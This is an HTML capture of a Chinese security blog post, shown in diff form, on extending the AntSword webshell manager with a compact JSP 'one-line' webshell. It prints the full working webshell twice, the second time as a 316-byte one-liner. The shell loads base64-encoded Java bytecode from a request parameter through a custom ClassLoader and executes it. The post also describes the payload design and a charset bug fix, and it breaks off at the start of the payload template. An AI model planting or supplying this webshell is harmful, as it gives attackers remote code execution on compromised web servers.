@@ -1,0 +1,885 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>蚁剑改造计划之实现JSP一句话 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="蚁剑改造计划之实现JSP一句话" />
+<meta property="og:description" content="1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/antsword-diy-3/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-28T13:24:58+00:00" />
+<meta property="article:modified_time" content="2020-03-28T13:24:58+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="蚁剑改造计划之实现JSP一句话"/>
+<meta name="twitter:description" content="1 前言本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。 因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/antsword-diy-3/" /><link rel="prev" href="https://yzddmr6.com/posts/antsword-diy-2/" /><link rel="next" href="https://yzddmr6.com/posts/antsword-diy-4/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "蚁剑改造计划之实现JSP一句话",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/antsword-diy-3\/"
+        },"genre": "posts","keywords": "中国蚁剑","wordcount":  3991 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/antsword-diy-3\/","datePublished": "2020-03-28T13:24:58+00:00","dateModified": "2020-03-28T13:24:58+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a></li>
+        <li><a href="#思路的选择">思路的选择</a></li>
+        <li><a href="#具体实现">具体实现</a>
+          <ul>
+            <li><a href="#编译环境的选择">编译环境的选择</a></li>
+            <li><a href="#乱码问题的解决">乱码问题的解决</a></li>
+            <li><a href="#模板设计">模板设计</a></li>
+            <li><a href="#蚁剑客户端修改">蚁剑客户端修改</a></li>
+            <li><a href="#实现效果">实现效果</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">蚁剑改造计划之实现JSP一句话</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-03-28">2020-03-28</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-03-28">2020-03-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3991 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#基本原理">基本原理</a></li>
+        <li><a href="#思路的选择">思路的选择</a></li>
+        <li><a href="#具体实现">具体实现</a>
+          <ul>
+            <li><a href="#编译环境的选择">编译环境的选择</a></li>
+            <li><a href="#乱码问题的解决">乱码问题的解决</a></li>
+            <li><a href="#模板设计">模板设计</a></li>
+            <li><a href="#蚁剑客户端修改">蚁剑客户端修改</a></li>
+            <li><a href="#实现效果">实现效果</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>本人有意写一份系列文章，主要内容是分享蚁剑改造过程中的一些技巧与经验。</p>
+<p>因为蚁剑的相关文档实在比较少，可能很多同学都像自己当初一样想要二次开发可是不知如何下手。</p>
+<p>不敢贸然称之为教程，只是把改造的过程发出来供大家借鉴，希望其他同学能够少走弯路。</p>
+<ul>
+<li>
+<p><a href="https://xz.aliyun.com/t/6571" target="_blank" rel="noopener noreferrer">蚁剑改造计划之实现动态秘钥编码器解码器</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/6917" target="_blank" rel="noopener noreferrer">蚁剑改造计划之基于随机Cookie的动态秘钥编码器</a></p>
+</li>
+<li>
+<p><a href="https://xz.aliyun.com/t/7126" target="_blank" rel="noopener noreferrer">蚁剑改造计划之增加垃圾数据</a></p>
+</li>
+<li>
+<p><a href="https://yzddmr6.tk/posts/antsword-diy-2/" target="_blank" rel="noopener noreferrer">蚁剑改造计划之实现其他参数的随机化</a></p>
+</li>
+</ul>
+<h2 id="正文" class="headerLink">
+    <a href="#%e6%ad%a3%e6%96%87" class="header-mark"></a>2 正文</h2><h3 id="基本原理" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%ac%e5%8e%9f%e7%90%86" class="header-mark"></a>2.1 基本原理</h3><p>由于Java中没有所谓的eval函数，无法对直接传递的代码进行解析执行。所以不管是蚁剑还是菜刀对于JSP的shell一直是采用custom模式，即把要执行的代码提前写在shell中，然后每次只需要传递要调用的函数名以及对应的参数即可。</p>
+<p>虽然可以实现相应的功能，但是带来一个问题就是shell体积非常巨大。菜刀的jsp脚本有7kb大小，蚁剑的jsp custom脚本即使去掉注释后还有17k之多，用起来非常的不方便。</p>
+<p>冰蝎的作者rebeyond大佬在文章 <a href="https://xz.aliyun.com/t/2744" target="_blank" rel="noopener noreferrer">利用动态二进制加密实现新型一句话木马之Java篇</a> 中提出了一种新的jsp一句话的实现方式：利用classloader直接解析编译后的class字节码，相当于实现了一个java的eval功能。</p>
+<p>反复阅读rebeyond大佬的文章，不得不感叹思路的巧妙。</p>
+<p>自己以前通过类反射+动态加载字节码的方式实现了一个命令执行后门，但是是在shell中获取的输入输出。参数个数也不可控，只能一股脑按最大数传进去，还会有类反射的特征。</p>
+<p>然而冰蝎是直接重写了Object类的equals方法，并且把pageContext传了进去。熟悉jsp的同学都知道，通过pageContext就可以控制几乎所有的页面对象，也就可以在payload中动态控制输入输出。</p>
+<p>冰蝎的方法既没有类反射之类的特征，又便于控制输入输出，实在是妙。</p>
+<p>但是冰蝎很久没更新了，并且暂时没有开源，有些小BUG修改起来非常麻烦。我就想能否把这个功能给移植到蚁剑上。</p>
+<p>冰蝎的操作是直接用asm框架来修改提前写好的字节码文件，把要传入的参数直接编译进去。由于冰蝎自身就是java写的，所以动态产生字节码具有天生的优势。但是蚁剑的后端是nodejs，这怎么办呢？</p>
+<h3 id="思路的选择" class="headerLink">
+    <a href="#%e6%80%9d%e8%b7%af%e7%9a%84%e9%80%89%e6%8b%a9" class="header-mark"></a>2.2 思路的选择</h3><p>大概有以下三种思路：</p>
+<p>（1）用nodejs来修改java字节码。</p>
+<p>（2）写一个专门用来生成payload的jar包，每次执行前调用此jar包，把需要编译的参数通过命令行传入，然后获取回显。</p>
+<p>（3）在蚁剑中硬编码payload，然后通过getParameter把参数传进去。</p>
+<p>三种方式各有利弊，第一个想法最简单，但是难度大。超出了本人菜鸟教程上学来的java跟node水平。</p>
+<p>自己本来是想采用第二个思路，跟yan表哥交流后放弃。就不说用exec调用会不会产生命令注入这种东西，采用第二种方式需要修改蚁剑原有的模式框架，并且还需要配置java环境。而蚁剑从设计之初就是想着能尽量减少对环境的需求。尽管从2.0系列推出加载器后不再需要node环境就可以运行蚁剑，但是目前还是有一堆人连安装蚁剑都有困难。</p>
+<p>所以在本文中实现的是第三种思路，<strong>硬编码payload+其他参数传参</strong>。</p>
+<p>首先根据现成的custom脚本来编写payload，然后把custom的模板给复制一份，把传递的函数名替换成payload即可。</p>
+<p>采用这种模式的话就跟其他shell发送payload的模式相同，不需要对蚁剑原有的框架进行大改。只不过其他类型传递的是可见的代码，jsp传递的是编译后的字节码。</p>
+<h3 id="具体实现" class="headerLink">
+    <a href="#%e5%85%b7%e4%bd%93%e5%ae%9e%e7%8e%b0" class="header-mark"></a>2.3 具体实现</h3><h4 id="编译环境的选择" class="headerLink">
+    <a href="#%e7%bc%96%e8%af%91%e7%8e%af%e5%a2%83%e7%9a%84%e9%80%89%e6%8b%a9" class="header-mark"></a>2.3.1 编译环境的选择</h4><p>首先是编译环境的问题。要知道java是向下兼容的，也就是说jdk1.6编译出来的字节码在1.8上可以运行，但是1.8的字节码在1.6上就不一定跑得起来。所以在实现的时候采用了jdk1.6编译，依赖的jar包也采用了跟冰蝎相同的tomcat7的jar。</p>
+<p>编译命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">javac -cp &#34;D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar&#34; Test.java
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>保存编译后的class字节码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">base64 -w 0 Test.class &gt; Test.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="乱码问题的解决" class="headerLink">
+    <a href="#%e4%b9%b1%e7%a0%81%e9%97%ae%e9%a2%98%e7%9a%84%e8%a7%a3%e5%86%b3" class="header-mark"></a>2.3.2 乱码问题的解决</h4><p>然后是让人头秃的乱码问题。</p>
+<p>众所周知windows采用的是GBK，不是UTF-8。本来想学习一下蚁剑custom脚本中是如何实现的，结果发现了一个存在了四年的编码逻辑错误。</p>
+<p>在php版的custom中对于编码是这样处理的：</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376517-54063213-d7fb-456c-8380-703ee6d77605.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>其中EC是识别charset的，也就是分辨UTF8还是GBK，然后用mb_convert_encoding函数转换到指定的编码中。</p>
+<p>decode函数是对字符串进行解码，比如说base64、hex这种。</p>
+<p>但是难道不应该先base64解码之后再判断charset吗，直接对base64的内容进行charset判断肯定是有问题的。</p>
+<p>调试了一下果然会乱码，然后报找不到路径的错误。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376696-e8244a99-8c0b-4c51-b717-701fa83c6c30.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>解决方法就是把两个函数换换位置就好了。</p>
+<p>换了之后就可以正常进入中文路径了。因为在vscode中设置变量以UTF8显示，所以此时左边GBK编码的路径会显示乱码，但是函数中是可以正常识别的。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376817-ab8582dc-f487-42df-8c65-b13a10853c03.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>把jsp的custom脚本中函数换了位置后，中文文件可以正常显示，但是进入中文路径的时候还是会报空指针错误。</p>
+<p>突然想起来自己以前提的一个issue <a href="https://github.com/AntSwordProject/antSword/issues/143" target="_blank" rel="noopener noreferrer">jsp的bug</a>，其实也是路径中出现了中文的问题，不过当时没有细究就略过了。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900376935-ea43e09f-4c2a-44c8-9b2e-de5cb7d568b5.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>经过调试后发现只要把hex跟base64解码后，强制使用UTF8编码就可以正常进入中文路径。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377017-ff2605ab-e912-4ab6-ae77-2bc5bbcf10b8.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900377110-f6e42800-544d-4d9f-bc71-47868ff1a477.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>原因为什么呢？</p>
+<p>因为base64对GBK类型的中文和跟UTF8类型的中文编码结果是不一样的，然而抓包发现蚁剑在custom模式下，不管用户选择的编码是什么都是对UTF8编码的中文进行base64处理。</p>
+<p>但是经过测试php类型会正常的根据用户的字符类型来base64编码。</p>
+<p>emmmm，玄学问题。</p>
+<p>最简单的解决方法就是直接在payload中base64解码的时候强制使用UTF-8解码。</p>
+<h4 id="模板设计" class="headerLink">
+    <a href="#%e6%a8%a1%e6%9d%bf%e8%ae%be%e8%ae%a1" class="header-mark"></a>2.3.3 模板设计</h4><p>Shell模板</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.misc.BASE64Decoder&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%!
+</span></span><span class="line"><span class="cl">    class U extends ClassLoader{
+</span></span><span class="line"><span class="cl">        U(ClassLoader c){
+</span></span><span class="line"><span class="cl">            super(c);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        public Class g(byte []b){
+</span></span><span class="line"><span class="cl">            return super.defineClass(b,0,b.length);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    BASE64Decoder decoder=new sun.misc.BASE64Decoder();
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    String cls=request.getParameter(&#34;ant&#34;);
+</span></span><span class="line"><span class="cl">    if(cls!=null){
+</span></span><span class="line"><span class="cl">    new U(this.getClass().getClassLoader()).g(decoder.decodeBuffer(cls)).newInstance().equals(pageContext);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>压缩一下后只有316个字节，由于去掉了解密功能，所以比冰蝎还小。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%!class U extends ClassLoader{ U(ClassLoader c){ super(c); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%&gt;&lt;% String cls=request.getParameter(&#34;ant&#34;);if(cls!=null){ new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Payload模板</p>
+<p>其中<code>encoder</code>为编码方式，默认为空，可选hex或者base64。<code>charset</code>为字符编码，默认UTF-8。蚁剑将会根据用户的选择自动发送。</p>
+<p><strong>注意：特别不建议选用默认编码器，遇到中文路径会错误，我也不知道为什么。</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import javax.servlet.ServletRequest;
+</span></span><span class="line"><span class="cl">import javax.servlet.ServletResponse;
